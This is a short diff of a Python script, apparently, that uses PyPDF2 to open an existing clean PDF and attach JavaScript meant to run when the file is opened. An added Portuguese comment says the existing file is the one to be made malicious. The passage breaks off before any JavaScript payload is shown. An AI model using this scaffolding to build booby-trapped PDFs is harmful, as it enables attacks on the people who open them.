@@ -2,7 +2,7 @@ from PyPDF2 import PdfWriter, PdfReader
 
 # Cria um novo PDF com JavaScript
 output = PdfWriter()
-input_pdf = PdfReader(open("documento_limpo.pdf", "rb"))
+input_pdf = PdfReader(open("documento_limpo.pdf", "rb")) # pega um arquivo ja existente, oque vamos deixar malicioso
 
 # Adiciona o JavaScript ao PDF (ação ao abrir)
 js_code = """
